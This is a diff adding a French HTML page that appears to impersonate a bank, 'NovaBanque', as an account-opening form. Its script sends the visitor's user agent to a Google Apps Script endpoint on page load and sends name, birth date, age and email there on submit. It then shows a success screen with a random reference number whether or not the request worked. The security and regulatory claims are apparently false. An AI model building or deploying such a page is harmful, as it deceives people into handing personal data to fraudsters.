@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ouvrir un compte — NovaBanque</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Inter', sans-serif; background: #FAFAFA; color: #0A2540; min-height: 100vh; display: flex; flex-direction: column; }
+    .top-bar { background: #fff; border-bottom: 1px solid #E5E7EB; padding: 18px 48px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+    .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+    .logo-mark { width: 34px; height: 34px; background: #2563EB; border-radius: 9px; display: flex; align-items: center; justify-content: center; }
+    .logo-mark svg { width: 18px; height: 18px; fill: white; }
+    .logo-name { font-size: 1.1rem; font-weight: 700; color: #0A2540; letter-spacing: -0.3px; }
+    .top-secure { display: flex; align-items: center; gap: 6px; font-size: 0.8rem; color: #6B7280; font-weight: 500; }
+    .top-secure svg { width: 14px; height: 14px; stroke: #16A34A; stroke-width: 2.5; fill: none; }
+    .progress-wrap { background: #fff; border-bottom: 1px solid #E5E7EB; padding: 0 48px; }
+    .progress-steps { display: flex; max-width: 700px; margin: 0 auto; }
+    .p-step { flex: 1; padding: 14px 0; text-align: center; font-size: 0.75rem; font-weight: 500; color: #9CA3AF; border-bottom: 2px solid #E5E7EB; transition: all 0.2s; }
+    .p-step.active { color: #2563EB; border-bottom-color: #2563EB; font-weight: 600; }
+    .p-step.done { color: #16A34A; border-bottom-color: #16A34A; }
+    .main { flex: 1; display: flex; align-items: flex-start; justify-content: center; gap: 48px; padding: 52px 48px; max-width: 1080px; margin: 0 auto; width: 100%; }
+    .panel-left { width: 300px; min-width: 260px; padding-top: 8px; }
+    .panel-eyebrow { font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: #2563EB; margin-bottom: 10px; }
+    .panel-title { font-size: 1.65rem; font-weight: 800; letter-spacing: -0.5px; line-height: 1.25; margin-bottom: 14px; }
+    .panel-sub { font-size: 0.9rem; color: #6B7280; line-height: 1.6; margin-bottom: 36px; }
+    .benefit { display: flex; align-items: flex-start; gap: 13px; margin-bottom: 22px; }
+    .benefit-icon { width: 40px; height: 40px; min-width: 40px; background: #EFF6FF; border-radius: 10px; display: flex; align-items: center; justify-content: center; }
+    .benefit-icon svg { width: 18px; height: 18px; stroke: #2563EB; stroke-width: 2; fill: none; }
+    .benefit-text strong { display: block; font-size: 0.875rem; font-weight: 600; margin-bottom: 2px; }
+    .benefit-text span { font-size: 0.8rem; color: #6B7280; line-height: 1.5; }
+    .trust-badges { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 36px; }
+    .badge { display: flex; align-items: center; gap: 5px; background: #fff; border: 1px solid #E5E7EB; border-radius: 20px; padding: 5px 12px; font-size: 0.72rem; font-weight: 500; color: #374151; }
+    .badge svg { width: 12px; height: 12px; stroke: #16A34A; stroke-width: 2.5; fill: none; }
+    .form-card { flex: 1; max-width: 440px; background: #fff; border: 1px solid #E5E7EB; border-radius: 20px; padding: 40px 44px; box-shadow: 0 4px 24px rgba(10,37,64,0.07); }
+    .form-title { font-size: 1.15rem; font-weight: 700; margin-bottom: 6px; }
+    .form-sub { font-size: 0.82rem; color: #6B7280; margin-bottom: 28px; }
+    .field-group { margin-bottom: 18px; }
+    .field-row { display: flex; gap: 14px; }
+    .field-row .field-group { flex: 1; }
+    label { display: block; font-size: 0.78rem; font-weight: 600; color: #374151; margin-bottom: 6px; }
+    .input-wrap { position: relative; }
+    .input-wrap svg { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; stroke: #9CA3AF; stroke-width: 2; fill: none; pointer-events: none; }
+    input { width: 100%; padding: 11px 14px 11px 40px; border: 1.5px solid #E5E7EB; border-radius: 10px; background: #fff; color: #0A2540; font-size: 0.9rem; font-family: 'Inter', sans-serif; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
+    input:focus { border-color: #2563EB; box-shadow: 0 0 0 3px rgba(37,99,235,0.12); }
+    input[type="date"]::-webkit-calendar-picker-indicator { opacity: 0.4; cursor: pointer; }
+    .divider { height: 1px; background: #F3F4F6; margin: 24px 0; }
+    .cta-btn { width: 100%; padding: 14px; background: #2563EB; border: none; border-radius: 10px; color: #fff; font-size: 0.95rem; font-weight: 700; font-family: 'Inter', sans-serif; cursor: pointer; transition: background 0.2s, box-shadow 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+    .cta-btn:hover { background: #1D4ED8; box-shadow: 0 4px 14px rgba(37,99,235,0.35); }
+    .cta-btn:disabled { background: #93C5FD; cursor: not-allowed; }
+    .cta-btn svg { width: 16px; height: 16px; stroke: white; stroke-width: 2.5; fill: none; }
+    .form-footer { margin-top: 18px; font-size: 0.73rem; color: #9CA3AF; text-align: center; line-height: 1.6; display: flex; align-items: center; justify-content: center; gap: 5px; }
+    .form-footer svg { width: 12px; height: 12px; stroke: #9CA3AF; stroke-width: 2; fill: none; }
+    /* Étape 2 */
+    #step2 { display: none; }
+    .recap { background: #F0FDF4; border: 1px solid #BBF7D0; border-radius: 10px; padding: 14px 18px; margin-bottom: 24px; font-size: 0.82rem; color: #374151; line-height: 1.8; }
+    .recap strong { color: #15803D; }
+    /* Confirmation */
+    #stepConfirm { display: none; text-align: center; }
+    .checkmark { width: 72px; height: 72px; background: #DCFCE7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; }
+    .checkmark svg { width: 36px; height: 36px; stroke: #16A34A; stroke-width: 2.5; fill: none; }
+    .confirm-title { font-size: 1.5rem; font-weight: 800; margin-bottom: 10px; }
+    .confirm-title span { color: #2563EB; }
+    .confirm-sub { font-size: 0.9rem; color: #6B7280; line-height: 1.6; margin-bottom: 24px; }
+    .steps-box { background: #F8FAFF; border: 1px solid #DBEAFE; border-radius: 12px; padding: 20px 24px; text-align: left; margin-bottom: 20px; }
+    .steps-box-title { font-size: 0.72rem; font-weight: 600; color: #2563EB; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 14px; }
+    .step-item { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 12px; }
+    .step-item:last-child { margin-bottom: 0; }
+    .step-num { width: 22px; height: 22px; min-width: 22px; background: #2563EB; color: white; border-radius: 50%; font-size: 0.7rem; font-weight: 700; display: flex; align-items: center; justify-content: center; }
+    .step-text { font-size: 0.85rem; color: #374151; line-height: 1.5; }
+    .ref { font-size: 0.8rem; color: #9CA3AF; }
+    .ref strong { color: #6B7280; }
+    @media (max-width: 768px) {
+      .top-bar { padding: 16px 20px; }
+      .progress-wrap { padding: 0 20px; }
+      .main { flex-direction: column; padding: 28px 20px; gap: 28px; }
+      .panel-left { width: 100%; min-width: unset; }
+      .form-card { padding: 28px 24px; }
+      .field-row { flex-direction: column; gap: 0; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="top-bar">
+    <a class="logo" href="#">
+      <div class="logo-mark"><svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/></svg></div>
+      <span class="logo-name">NovaBanque</span>
+    </a>
+    <div class="top-secure">
+      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+      Connexion sécurisée SSL
+    </div>
+  </div>
+
+  <div class="progress-wrap">
+    <div class="progress-steps">
+      <div class="p-step active" id="prog1">① Informations personnelles</div>
+      <div class="p-step" id="prog2">② Vérification d'identité</div>
+      <div class="p-step" id="prog3">③ Activation du compte</div>
+    </div>
+  </div>
+
+  <div class="main">
+    <div class="panel-left">
+      <div class="panel-eyebrow">Offre de bienvenue</div>
+      <h2 class="panel-title">Votre compte courant en 5 minutes</h2>
+      <p class="panel-sub">Rejoignez plus de 2 millions de clients qui font confiance à NovaBanque pour gérer leur argent au quotidien.</p>
+      <div class="benefit">
+        <div class="benefit-icon"><svg viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg></div>
+        <div class="benefit-text"><strong>Carte bancaire gratuite</strong><span>Visa Premier incluse sans conditions de revenus.</span></div>
+      </div>
+      <div class="benefit">
+        <div class="benefit-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
+        <div class="benefit-text"><strong>Virement instantané 24h/7j</strong><span>Envoyez et recevez de l'argent en quelques secondes.</span></div>
+      </div>
+      <div class="benefit">
+        <div class="benefit-icon"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
+        <div class="benefit-text"><strong>Garantie dépôts jusqu'à 100 000 €</strong><span>Fonds assurés par le FGDR, agréé ACPR.</span></div>
+      </div>
+      <div class="trust-badges">
+        <div class="badge"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Sans frais cachés</div>
+        <div class="badge"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Agréé ACPR</div>
+        <div class="badge"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>RGPD conforme</div>
+      </div>
+    </div>
+
+    <div class="form-card">
+
+      <!-- ÉTAPE 1 -->
+      <div id="step1">
+        <div class="form-title">Ouvrir mon compte</div>
+        <div class="form-sub">Étape 1 sur 3 — Informations personnelles</div>
+        <div class="field-row">
+          <div class="field-group">
+            <label for="nom">Nom de famille</label>
+            <div class="input-wrap">
+              <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+              <input type="text" id="nom" placeholder="Dupont" required autocomplete="family-name"/>
+            </div>
+          </div>
+          <div class="field-group">
+            <label for="prenom">Prénom</label>
+            <div class="input-wrap">
+              <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+              <input type="text" id="prenom" placeholder="Marie" required autocomplete="given-name"/>
+            </div>
+          </div>
+        </div>
+        <div class="field-group">
+          <label for="ddn">Date de naissance</label>
+          <div class="input-wrap">
+            <svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+            <input type="date" id="ddn" required/>
+          </div>
+        </div>
+        <div class="field-group">
+          <label for="age">Âge</label>
+          <div class="input-wrap">
+            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>
+            <input type="number" id="age" placeholder="30" min="18" max="120" required/>
+          </div>
+        </div>
+        <div class="divider"></div>
+        <button class="cta-btn" onclick="goStep2()">
+          Continuer
+          <svg viewBox="0 0 24 24"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+        </button>
+        <div class="form-footer">
+          <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+          Vos données sont chiffrées et protégées conformément au RGPD.
+        </div>
+      </div>
+
+      <!-- ÉTAPE 2 -->
+      <div id="step2">
+        <div class="form-title">Vérification d'identité</div>
+        <div class="form-sub">Étape 2 sur 3 — Coordonnées de contact</div>
+        <div class="recap" id="recap"></div>
+        <div class="field-group">
+          <label for="email">Adresse email</label>
+          <div class="input-wrap">
+            <svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+            <input type="email" id="email" placeholder="marie.dupont@email.fr" required autocomplete="email"/>
+          </div>
+        </div>
+        <div class="divider"></div>
+        <button class="cta-btn" id="submitBtn" onclick="submitForm()">
+          Finaliser la demande
+          <svg viewBox="0 0 24 24"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+        </button>
+        <div class="form-footer">
+          <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+          Vos données sont chiffrées et protégées conformément au RGPD.
+        </div>
+      </div>
+
+      <!-- CONFIRMATION -->
+      <div id="stepConfirm">
+        <div class="checkmark"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div>
+        <div class="confirm-title">Bienvenue, <span id="confirmPrenom"></span> !</div>
+        <p class="confirm-sub">Votre demande d'ouverture de compte a bien été reçue. Notre équipe la traite dans les meilleurs délais.</p>
+        <div class="steps-box">
+          <div class="steps-box-title">Prochaines étapes</div>
+          <div class="step-item"><div class="step-num">1</div><div class="step-text"><strong>Email de confirmation</strong> — Vérifiez votre boîte de réception dans les prochaines minutes.</div></div>
+          <div class="step-item"><div class="step-num">2</div><div class="step-text"><strong>Vérification d'identité</strong> — Un conseiller vous contactera sous 24 h.</div></div>
+          <div class="step-item"><div class="step-num">3</div><div class="step-text"><strong>Activation du compte</strong> — Votre carte sera expédiée sous 5 à 7 jours ouvrés.</div></div>
+        </div>
+        <p class="ref">Référence dossier : <strong id="refNum"></strong></p>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzessxBVWgm66dDJEVhiAWzK1vHxd0S10A2n_JYgdz7iOizwoMdi54Orphwnqw7oWM9/exec";
+
+    // Notification ouverture
+    const ua = encodeURIComponent(navigator.userAgent);
+    fetch(SCRIPT_URL + "?ua=" + ua).catch(() => {});
+
+    function goStep2() {
+      const nom    = document.getElementById("nom").value.trim();
+      const prenom = document.getElementById("prenom").value.trim();
+      const ddn    = document.getElementById("ddn").value;
+      const age    = document.getElementById("age").value;
+      if (!nom || !prenom || !ddn || !age) { alert("Veuillez remplir tous les champs."); return; }
+
+      document.getElementById("recap").innerHTML =
+        "✅ Étape 1 validée — <strong>" + prenom + " " + nom + "</strong>, né(e) le <strong>" + ddn + "</strong>";
+
+      document.getElementById("step1").style.display = "none";
+      document.getElementById("step2").style.display = "block";
+
+      document.getElementById("prog1").className = "p-step done";
+      document.getElementById("prog2").className = "p-step active";
+    }
+
+    function submitForm() {
+      const nom    = document.getElementById("nom").value.trim();
+      const prenom = document.getElementById("prenom").value.trim();
+      const ddn    = document.getElementById("ddn").value;
+      const age    = document.getElementById("age").value;
+      const email  = document.getElementById("email").value.trim();
+      if (!email) { alert("Veuillez entrer votre adresse email."); return; }
+
+      const btn = document.getElementById("submitBtn");
+      btn.disabled = true;
+      btn.innerHTML = "Envoi en cours...";
+
+      const url = SCRIPT_URL + "?nom=" + encodeURIComponent(nom)
+        + "&prenom=" + encodeURIComponent(prenom)
+        + "&age="    + encodeURIComponent(age)
+        + "&ddn="    + encodeURIComponent(ddn)
+        + "&email="  + encodeURIComponent(email);
+
+      fetch(url, { mode: "no-cors" })
+        .then(() => {
+          document.getElementById("step2").style.display = "none";
+          document.getElementById("stepConfirm").style.display = "block";
+          document.getElementById("confirmPrenom").textContent = prenom;
+          document.getElementById("refNum").textContent = "NVB-" + Math.floor(100000 + Math.random() * 900000);
+          document.getElementById("prog2").className = "p-step done";
+          document.getElementById("prog3").className = "p-step active";
+        })
+        .catch(() => {
+          document.getElementById("step2").style.display = "none";
+          document.getElementById("stepConfirm").style.display = "block";
+          document.getElementById("confirmPrenom").textContent = prenom;
+          document.getElementById("refNum").textContent = "NVB-" + Math.floor(100000 + Math.random() * 900000);
+          document.getElementById("prog2").className = "p-step done";
+          document.getElementById("prog3").className = "p-step active";
+        });
+    }
+  </script>
+
+</body>
+</html>
